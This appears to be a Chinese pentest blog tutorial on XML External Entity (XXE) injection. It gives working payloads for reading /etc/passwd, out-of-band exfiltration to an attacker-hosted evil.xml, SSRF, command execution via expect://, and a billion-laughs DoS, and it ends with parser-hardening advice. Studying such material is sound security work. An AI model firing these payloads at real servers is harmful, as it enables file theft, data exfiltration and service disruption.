---
layout:     post
title:      "Hacking via XXE"
date:       2016-11-25
categories: [pentest]

---

### XML简介

​	XML 指可扩展标记语言（*EX*tensible *M*arkup *L*anguage），有点类似 HTML，但它与HTML的区别在于其设计宗旨是*传输数据*，而非显示数据。XML常被用来作为配置文件（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）及数据传输共享。

**XML文档格式**

​	XML文件一般存在三部分，包括XML声明、文档类型定义（DTD）及文档元素。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
// XML声明

<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]> 
// 文档类型定义

<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
// 文档元素
```

**文档类型定义DTD**

​	文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

```
//XML文件
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 
```

```xml
//被引用的note.dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

### XXE漏洞攻击

​	XML外部实体注入（XML External Entity），简称**XXE**，漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。而在XEE漏洞的基础上，发展出了Blind XXE漏洞。

​	对于传统的XXE来说，要求有一点，就是攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件。例如提交如下请求：

```xml
<?xml version="1.0"?><!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/issue">]>
<data>&file;</data>
```

​	如果服务器没有回显，只能使用 OOB(外带数据) 攻击来绕过对基本的 XXE 攻击的限制，这种漏洞也成为Blind XXE漏洞。在进行blind XXE攻击时，将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。例如提交如下请求：

```xml
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % file SYSTEM "file:///etc/passwd">  
<!ENTITY % remote SYSTEM "http://192.168.199.1/evil.xml">  
%remote;  
%all;  
]>  
<root>&send;</root> 
```

在攻击者的VPS中可起一个web服务，将以下evil.xml保存在该web目录下供远程加载。

```xml
//evil.xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.199.1/?file=%file;'>">
```

​	实体remote，all，send的引用顺序很重要，首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，然后执行%all，这时会检测到send实体，在root节点中引用send，就可以成功实现数据转发。当然，也直接在DTD中引用send实体，如果在evil.xml中，send是个参数实体的话，即以下方式：

```xml
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % file SYSTEM "file:///C:/1.txt">  
<!ENTITY % remote SYSTEM "http://192.168.150.1/evil.xml">  
%remote;  
%all;  
%send;  
]> 
```

```xml
//evil.xml
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.168.150.1/1.php?file=%file;'>">  
```

**Json to XML**

​	由于多方面因素，现在人们更倾向于使用json来代替xml，当WEB服务使用xml或者json中的一种进行传输时，服务器可能会接收开发人员并未预料到的数据格式。如果服务器上的XML解析器的配置不完善，在json传输的终端可能会遭受XXE攻击。这里我们对比以下两个请求：

```http
HTTP Request:
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/json
Content-Length: 38
{"search":"name","value":"netspitest"}

HTTP Response:
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 43
{"error": "no results for name netspitest"}
```

​	如果Content-Type头被修改为application/xml，客户端会告诉服务器post过去的数据是XML格式的。但如果你实际传过去的不是该格式的话，服务器不会进行解析，并且会报如下的错：

```http
HTTP Request:
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 38
{"search":"name","value":"netspitest"}

HTTP Request:
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Content-Length: 127
{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}
```

​	该错误提示指出，服务器能够处理XML格式和JSON格式的数据，但现在服务器收到的真实数据格式并不是在Content-Type里声明的XML格式，所以这里自然不能被解析啦。为了解决这个问题，JSON格式被强行转换为XML格式，转换后我们也可以进行XXE测试。Burp中有一个插件Content-Type Converter可实现xml与json的互转。

#### XXE漏洞危害

**任意文件读取**

​	这里有两种方法，基础的上边有提过，还有一种是通过php的伪协议进行，读取到的内容通过base64解码可查看。

```xml
//基础
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
<foo>&xxe;</foo>
```

```xml
//通过PHP伪协议
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ENTITY a SYSTEM ‘php://filter/read=convert.base64-encode/resource=/etc/passwd’>]>  
```

**SSRF**

​	DTD支持http、ftp、gopher等网络协议，通过这些协议可以发送SSRF攻击请求，包括内网探测及攻击内网服务器等。

![ssrf1](http://reverse-tcp.xyz/img/xxe/SSRF1.png)

![ssrf2](http://reverse-tcp.xyz/img/xxe/SSRF2.png)

**RCE**

​	 如果目标服务器的PHP安装有expect扩展，则可以进行系统命令执行。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
   <user>&xxe;</user>
   <pass>mypass</pass>
</creds>
```



![RCE](http://reverse-tcp.xyz/img/xxe/RCE.png)

**DOS**

​	通过实体递归的方式耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，造成DOS攻击。

```xml
<?xml version = "1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>
<lolz>&lol9;</lolz>
```

### 漏洞防御

**方案一：使用开发语言提供的禁用外部实体的方法**

PHP：libxml_disable_entity_loader(true);

**JAVA:**

DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();

dbf.setExpandEntityReferences(false);

**Python：**

from lxml import etree

xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

**方案二、过滤用户提交的XML数据**
关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。









